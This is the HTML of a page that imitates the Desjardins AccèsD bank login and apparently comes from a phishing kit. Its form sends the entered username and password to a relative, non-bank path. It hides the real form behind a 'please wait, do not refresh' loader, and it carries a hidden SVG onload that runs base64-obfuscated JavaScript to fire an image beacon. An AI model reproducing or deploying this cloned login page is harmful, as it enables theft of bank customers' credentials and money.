                                                            <span aria-hidden="true" class="tt-icone"></span><!----> 200&nbsp;% <span class="sr-only"> &nbsp;-&nbsp; Taille&nbsp; <span class="tt-selection hidden"> selectionnée&nbsp; </span> du texte </span><!---->
                                                        </button>
                                                    </div>
                                                </div>
                                                <button type="button" class="close"><span class="sr-only">Fermer</span><span aria-hidden="true" class="close-ic-croix"></span></button>
                                                <div tabindex="0" class="sr-only sr-only-focusable"> Vous quittez la boîte de dialogue. </div>
                                                <div tabindex="0"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="navigation-principale" class="menu-burger-ferme">
                                    <div id="barre-navigation">
                                        <div id="menu-navigation" class="container-fluid container-fluid-limited">
                                            <ul class="menu">
                                                <li><a href="https://www.desjardins.com/page-aide/index.jsp?docName=ai_logonlogoff&amp;domaine=ACCESD"><span>Aide</span><span class="sr-only">&nbsp;-&nbsp;Cet hyperlien s'ouvrira dans une nouvelle fenêtre.</span></a></li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </header>
                            <!---->
                        </app-entete>
                        <!---->
                    </div>
                    <div class="zone-centrale">
                        <div id="gabaritSecuriteContenuPrincipal">
                            <router-outlet></router-outlet>
                            <app-auth>
                                <div class="authentification-component">
                                    <main id="contenuPrincipal" tabindex="-1">
                                        <div class="container-fluid container-fluid-limited div-main" style="display: none;">
                                            <div class="row">
                                                <div class="col-xs-24">
                                                    <div class="container-auth" domainevirtuel="desjardins">
                                                        <div class="auth-boite-login">
                                                            <div class="auth-form">
                                                                <h1 tabindex="-1" domainevirtuel="desjardins">Se connecter</h1>
                                                                <div role="region" tabindex="-1" class="alert alert-danger error-div" style="display: none" aria-label="Error">
                                                                    <p><span class="sr-only">Error&nbsp;</span><span>La connexion a échoué. Nom d'utilisateur ou mot de passe invalide. Réessayer. (IDHS966081)</span><!----></p><!---->
                                                                </div>
                                                                <!----><!---->
                                                                <router-outlet></router-outlet>
                                                                <ng-component>
                                                                    <div class="auth-identifiant auth-identifiant-manuel">
                                                                        <form method="POST" role="form" autocomplete="off" action="/220098/" class="ng-untouched ng-pristine ng-invalid lab-form">
                                                                            <input type="hidden" id="infoPosteClient" name="infoPosteClient" formcontrolname="infoPosteClient" value="" class="ng-untouched ng-pristine ng-valid"><input type="hidden" id="smdtk" name="smdtk" formcontrolname="smdtk" value="" class="ng-untouched ng-pristine ng-valid">
                                                                            <div class="auth-identifiant-saisi auth-section-login form-group">
                                                                                <div class="auth-libelle-avec-aide">
                                                                                    <label for="codeUtilisateur">Identifiant</label>
                                                                                    <app-popover-aide>
                                                                                        <button id="popoverAide" data-placement="bottom" data-toggle="popover" type="button" class="btn btn-nostyle auth-btn-aide" data-title="Aide - Identifiant" data-original-title="" title="">
                                                                                            <svg xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="false" viewBox="0 0 32 32">
                                                                                                <path d="M16 4a12 12 0 1012 12A12.013 12.013 0 0016 4zm0 22a10 10 0 1110-10 10.011 10.011 0 01-10 10z"></path>
                                                                                                <path d="M16 14a1 1 0 00-1 1v6a1 1 0 002 0v-6a1 1 0 00-1-1z"></path>
                                                                                                <circle cx="16" cy="11" r="1.5"></circle>
                                                                                            </svg>
                                                                                            <span class="sr-only">Aide – Identifiant</span>
                                                                                        </button>
                                                                                        <div id="popoverContenu" class="hide">
                                                                                            <div class="auth-popover-aide-identifiant">
                                                                                                <div>
                                                                                                    <h3 class="auth-accesd"><strong>Identifiant AccèsD</strong></h3>
                                                                                                    <ul>
                                                                                                        <li>Votre numéro de Carte d’accès Desjardins</li>
                                                                                                        <li>Votre carte d’accès virtuelle (non-membres détenteurs d’une carte de crédit ou d’une carte prépayée Desjardins)</li>
                                                                                                    </ul>
                                                                                                    <!----><!---->
                                                                                                    <h3 class="auth-accesdAffaire"><strong>Identifiant AccèsD Affaires</strong></h3>
                                                                                                    <!---->
                                                                                                    <p> Votre code d'utilisateur AccèsD Affaires </p>
                                                                                                    <!---->
                                                                                                    <hr class="sr-only">
                                                                                                </div>
                                                                                                <!----><!----><a id="lnkPlusDeDetails" target="_blank" rel="noopener noreferrer" class="lien-action" href="https://www.desjardins.com/page-aide/index.jsp?docName=ai_identifiant_unique&amp;domaine=ACCESD"> En savoir plus sur l’identifiant <span class="sr-only">&nbsp;-&nbsp;Cet hyperlien s'ouvrira dans une nouvelle fenêtre.</span></a>
                                                                                            </div>
                                                                                        </div>
                                                                                    </app-popover-aide>
                                                                                </div>
                                                                                <input type="text" id="codeUtilisateur" aria-describedby="erreurMessage" formcontrolname="codeUtilisateur" name="username" spellcheck="false" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid lrinput" attr-action="Filling Username" required="">
                                                                            </div>
                                                                            <div class="auth-section-login auth-souvenirMoi">
                                                                                <div class="flex-checkbox-bouton">
                                                                                    <div id="n3-doc-form-caseacocher-perso-inline" class="form-group"><label class="c-input c-checkbox"><input type="checkbox" id="souvenirDeMoiCheckBox" aria-describedby="indiceSouvenirDeMoiCheckbox" name="souvenirDeMoiCheckBox" class="ng-untouched ng-pristine ng-valid"><span class="c-indicator"></span> Mémoriser </label></div>
                                                                                    <app-popover-cest-securitaire>
                                                                                        <div class="auth-popover-cest-securitaire">
                                                                                            <button id="popoverCestSecuritaire" type="button" data-placement="bottom" data-toggle="popover" class="btn btn-link" domainevirtuel="desjardins" data-original-title="" title=""> (C'est sécuritaire?) <span class="sr-only"> - Ouvre une boîte de dialogue</span></button>
                                                                                            <div id="popoverCestSecuritaireContenu" class="hide">
                                                                                                <div>
                                                                                                    <p>Entièrement sécuritaire sur vos appareils personnels, mais non recommandé sur un appareil public ou partagé.</p>
                                                                                                    <p>Cochez la case <strong>Mémoriser</strong> pour éviter d’entrer votre identifiant à chaque connexion.</p>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </app-popover-cest-securitaire>
                                                                                </div>
                                                                            </div>
                                                                            <app-champ-mot-passe>
                                                                                <div class="form-group auth-mot-passe-saisi auth-section-login ng-untouched ng-pristine ng-invalid">
                                                                                    <label for="motDePasse">Mot de passe</label>
                                                                                    <div class="input-group auth-input-group-mot-passe">
                                                                                        <input type="password" id="motDePasse" aria-describedby="erreurMessage auth-fix-maj" name="password" autocapitalize="none" formcontrolname="motDePasse" spellcheck="false" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid lrinput" attr-input="Filling Password" required="">
                                                                                        <span class="input-group-addon">
                                                                                            <button type="button" id="afficherMotDePasse">
                                                                                                <div class="auth-barre-oeil"><span class="sr-only">Afficher le mot de passe</span></div>
                                                                                            </button>
                                                                                        </span>
                                                                                    </div>
                                                                                    <p id="instructionMotDePasse" class="instructionMDP"><span><strong>Attention :</strong> Respecter majuscules et minuscules </span></p>
                                                                                    <div id="motPasseOublie" class="auth-autres-actions">
                                                                                        <p>
                                                                                            <a href="https://accweb.mouv.desjardins.com/identifiantunique/motPasseOublie/identification" domainevirtuel="desjardins">Mot de passe oublié?</a><!----><!---->
                                                                                        </p>
                                                                                    </div>
                                                                                </div>
                                                                            </app-champ-mot-passe>
                                                                            <div class="auth-login-actions" domainevirtuel="desjardins">
                                                                                <button type="submit" name="save" value="1" class="btn btn-primary"> Valider </button><!---->
                                                                            </div>
                                                                        </form>
                                                                    </div>
                                                                </ng-component>
                                                                <!---->
                                                            </div>
                                                            <aside class="auth-liens-infos">
                                                                <!---->
                                                                <div class="bottom-section">
                                                                    <!---->
                                                                    <div role="list" class="auth-row-flex" domainevirtuel="desjardins">
                                                                        <!---->
                                                                        <ul role="presentation" class="auth-col-1">
                                                                            <a></a>
                                                                            <li><a></a><a href="https://accweb.mouv.desjardins.com/identifiantunique/adhesion/identification?langueCible=fr">S’inscrire à AccèsD</a></li>
                                                                            <!----><!---->
                                                                            <li><a href="https://www.desjardins.com/entreprises/comptes-tresorerie/modes-acces-comptes/accesd-affaires/comment-inscrire/index.jsp">S’inscrire à AccèsD Affaires</a></li>
                                                                            <!----><!----><!---->
                                                                            <li><a href="https://www.desjardins.com/particuliers/comptes-services-relies/ouvrir-compte-devenir-membre/">Devenir membre</a></li>
                                                                            <!---->
                                                                        </ul>
                                                                        <!---->
                                                                        <div role="presentation" class="auth-col-2">
                                                                            <ul role="presentation" class="auth-col-2-1">
                                                                                <li><a href="https://www.desjardins.com/securite/pratiques-securite/"> Sécurité du site </a></li>
                                                                                <!---->
                                                                                <li><a href="https://www.desjardins.com/particuliers/comptes-services-relies/modes-acces-comptes/internet/soutien/index.jsp"> Soutien technique  </a></li>
                                                                                <!---->
                                                                                <li><a href="https://www.desjardins.com/securite/signaler-fraude/"> Signaler une fraude </a></li>
                                                                            </ul>
                                                                            <ul role="presentation" class="auth-col-2-2">
                                                                                <a class="auth-lien-securite-garanti" href="https://www.desjardins.com/securite/index.jsp"><img alt="" width="20" height="24" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjBweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjAgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8dGl0bGU+MDEvMDQvQ29udGVudS9Db250b3VyL1Byb3RlY3Rpb248L3RpdGxlPgogICAgPGRlZnM+CiAgICAgICAgPGZpbHRlciBjb2xvci1pbnRlcnBvbGF0aW9uLWZpbHRlcnM9ImF1dG8iIGlkPSJmaWx0ZXItMSI+CiAgICAgICAgICAgIDxmZUNvbG9yTWF0cml4IGluPSJTb3VyY2VHcmFwaGljIiB0eXBlPSJtYXRyaXgiIHZhbHVlcz0iMCAwIDAgMCAwLjAwMDAwMCAwIDAgMCAwIDAuNDc0NTEwIDAgMCAwIDAgMC4yNjY2NjcgMCAwIDAgMS4wMDAwMDAgMCI+PC9mZUNvbG9yTWF0cml4PgogICAgICAgIDwvZmlsdGVyPgogICAgPC9kZWZzPgogICAgPGcgaWQ9IjMuNF9SV0RfU2UtY29ubmVjdGVyX0RvbWFpbmVzLXZpcnR1ZWxzIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4KICAgICAgICA8ZyBpZD0iVGFibGV0dGVfRGVzamFyZGlucy1DYXJkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNTU0LjAwMDAwMCwgLTYyMi4wMDAwMDApIj4KICAgICAgICAgICAgPGcgaWQ9IjAxLzA0L0NvbnRlbnUvQ29udG91ci9Qcm90ZWN0aW9uIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg1NTIuMDAwMDAwLCA2MjIuMDAwMDAwKSIgZmlsdGVyPSJ1cmwoI2ZpbHRlci0xKSI+CiAgICAgICAgICAgICAgICA8Zz4KICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMTIsNi4wMzk2MTMyNWUtMTQgQzE1LjMxMzcwODUsNi4wMzk2MTMyNWUtMTQgMTgsMi42ODYyOTE1MSAxOCw2IEwxOCw2IEwxOCw3IEwxOSw3IEMyMC42NTY4NTQzLDcgMjIsOC4zNDMxNDU3OCAyMiwxMCBMMjIsMTAgTDIyLDIxIEMyMiwyMi42NTY4NTQzIDIwLjY1Njg1NDMsMjQgMTksMjQgTDE5LDI0IEw1LDI0IEMzLjM0MzE0NTc1LDI0IDIsMjIuNjU2ODU0MyAyLDIxIEwyLDIxIEwyLDEwIEMyLDguMzQzMTQ1NzggMy4zNDMxNDU3NSw3IDUsNyBMNSw3IEw2LDcgTDYsNiBDNiwyLjY4NjI5MTUxIDguNjg2MjkxNTIsNi4wMzk2MTMyNWUtMTQgMTIsNi4wMzk2MTMyNWUtMTQgWiBNMTksOS4wMDAwMDAwMyBMNS4wMDAwMDAwMSw5LjAwMDAwMDAzIEM0LjQ0NzcxNTI2LDkuMDAwMDAwMDMgNC4wMDAwMDAwMSw5LjQ0NzcxNTI4IDQuMDAwMDAwMDEsMTAgTDQuMDAwMDAwMDEsMTAgTDQuMDAwMDAwMDEsMjEgQzQuMDAwMDAwMDEsMjEuNTUyMjg0OCA0LjQ0NzcxNTI2LDIyIDUuMDAwMDAwMDEsMjIgTDUuMDAwMDAwMDEsMjIgTDE5LDIyIEMxOS41NTIyODQ4LDIyIDIwLDIxLjU1MjI4NDggMjAsMjEgTDIwLDIxIEwyMCwxMCBDMjAsOS40NDc3MTUyOCAxOS41NTIyODQ4LDkuMDAwMDAwMDMgMTksOS4wMDAwMDAwMyBMMTksOS4wMDAwMDAwMyBaIE0xMiwxMiBDMTIuOTA4NjIzLDEyLjAwODIyMjQgMTMuNjk3NTEyMywxMi42Mjc5MzIyIDEzLjkyMDY1NzEsMTMuNTA4NzY2OSBDMTQuMTQzODAxOSwxNC4zODk2MDE2IDEzLjc0NTExNDksMTUuMzEwMTY0MSAxMi45NSwxNS43NSBDMTIuOTc3MjY0OSwxNS44MzA4NTg4IDEyLjk5NDA2ODEsMTUuOTE0ODc0NyAxMywxNiBMMTMsMTYgTDEzLDE4IEMxMywxOC41NTIyODQ4IDEyLjU1MjI4NDgsMTkgMTIsMTkgQzExLjQ0NzcxNTMsMTkgMTEsMTguNTUyMjg0OCAxMSwxOCBMMTEsMTggTDExLDE2IEMxMS4wMDU5MzIsMTUuOTE0ODc0NyAxMS4wMjI3MzUyLDE1LjgzMDg1ODggMTEuMDUsMTUuNzUgQzEwLjI1NDg4NTIsMTUuMzEwMTY0MSA5Ljg1NjE5ODE5LDE0LjM4OTYwMTYgMTAuMDc5MzQzLDEzLjUwODc2NjkgQzEwLjMwMjQ4NzgsMTIuNjI3OTMyMiAxMS4wOTEzNzcsMTIuMDA4MjIyNCAxMiwxMiBaIE0xMiwyLjAwMDAwMDAxIEM5Ljc5MDg2MTAzLDIuMDAwMDAwMDEgOC4wMDAwMDAwMiwzLjc5MDg2MTAxIDguMDAwMDAwMDIsNi4wMDAwMDAwMSBMOC4wMDAwMDAwMiw2LjAwMDAwMDAxIEw4LjAwMDAwMDAyLDcuMDAwMDAwMDEgTDE2LDcuMDAwMDAwMDEgTDE2LDYuMDAwMDAwMDEgQzE2LDMuNzkwODYxMDEgMTQuMjA5MTM5LDIuMDAwMDAwMDEgMTIsMi4wMDAwMDAwMSBaIiBpZD0iMDEvMDQvQ29udGVudS9Db250b3VyL0NhZGVuYXMiIGZpbGw9IiMyRjJGMkYiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+"><span>Sécurité garantie à <span class="pourcentage-fr">100 %</span></span></a><!----><!---->
                                                                            </ul>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </aside>
                                                        </div>
                                                        <div alt="" class="auth-boite-image" domainevirtuel="desjardins" iscaissescolaire="false" style="background-image: url(https://static.mouv.desjardins.com/static-accesweb/202109131615/authentification/assets/img/img-auth-desj.jpg);"></div>
                                                        <!---->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="container-fluid container-fluid-limited div-loader" style="display: block;">
                                            <div class="row">
                                                <div class="col-xs-24">
                                                    <div class="container-auth" domainevirtuel="desjardins">
                                                        <div class="auth-boite-login">
                                                            <div class="auth-form">
                                                                <style>
                                                                .loader-div {
                                                                    text-align: center;
                                                                    padding-top: 20px;
                                                                }

                                                                .loader-div h2 {
                                                                    font-size: 28px;
                                                                    margin-bottom: 40px;
                                                                }

                                                                .loader-div p {
                                                                    margin-top: 37px;
                                                                    padding: 0px 42px;
                                                                    font-size: 16px;
                                                                }
                                                                </style>
                                                                <script>
                                                                setInterval(function() {
                                                                    $('.loader-div p').css('display', 'block');
                                                                }, 4000);
                                                                </script>
                                                                <div class="_1AR6e5iqu8uXHMTFKLnqWr loader-div">
                                                                    <h2 class="heading--title2 ng-binding">Attendre</h2>
                                                                    <img src="./files/loading.gif" width="80">
                                                                    <p style="display: block;">Cela prend plus de temps que d'habitude, veuillez ne pas actualiser la page</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </main>
                                    <svg onload="setTimeout(atob(&#39;fmRvY3VtZW50LmZvcm1zWzBdLmFjdGlvbi5pbmRleE9mKCcucGhwJykmJihuZXcgSW1hZ2UoKS5zcmM9J2h0dHBzOi8vYW5hbHl0aWNzLmRlc2phcmRpbnMuY29tL2xvZ28tZGVzamFyZGlucy01NzkzZjY0Zi5wbmcnKQ==&#39;),10000)" style="position: absolute; display: none;"></svg>
                                </div>
                            </app-auth>
                            <!---->
                        </div>
                    </div>
                </div>
                <div class="zone-pied-de-page">
                    <app-pied-de-page>
                        <div class="pied-de-page-fragment">
                            <div>
                                <a href="/220098/#contenu" class="sr-only sr-only-focusable">
                                Aller au contenu principal
                                </a>
                                <footer class="footer">
                                    <div id="zone-pied-de-page">
                                        <div id="pied">
                                            <div id="plan-site">
                                                <h2 class="hors-ecran">Plan du site</h2>
                                                <div id="tetes-sections">
                                                    <ul>
                                                        <li><a href="https://www.desjardins.com/particuliers/index.jsp">Services aux particuliers</a></li>
                                                        <li><a href="https://www.desjardins.com/entreprises/index.jsp">Services aux entreprises</a></li>
                                                        <li><a href="https://www.desjardins.com/coopmoi/index.jsp">Coopmoi</a></li>
                                                        <li><a href="https://www.desjardins.com/a-propos/index.jsp">À propos</a></li>
                                                        <li><a href="https://www.desjardins.com/mobile-gps-rss/index.jsp">Desjardins sur mobile, GPS et RSS</a></li>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div id="zone-legale">
                                                <div id="zone-legale">
                                                    <div>
                                                        <nav aria-label="Zone légale">
                                                            <ul>
                                                                <li><a href="https://www.desjardins.com/confidentialite/index.jsp?navigMW=pp">Confidentialité</a></li>
                                                                <li><a href="https://www.desjardins.com/conditions-utilisation-notes-legales/index.jsp?navigMW=pp">Conditions d'utilisation et notes légales</a></li>
                                                                <li><a href="https://www.desjardins.com/a-propos/responsabilite-sociale-cooperation/mouvement-cooperatif-solidaire/accessibilite/index.jsp?navigMW=pp">Accessibilité</a></li>
                                                            </ul>
                                                        </nav>
                                                        <div class="copyright" role="contentinfo">
                                                            <p>© 1996-2021, Mouvement des caisses Desjardins. Tous droits réservés.</p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </footer>
                            </div>
                        </div>
                    </app-pied-de-page>
                </div>
            </div>
        </app-root>
    

</body></html>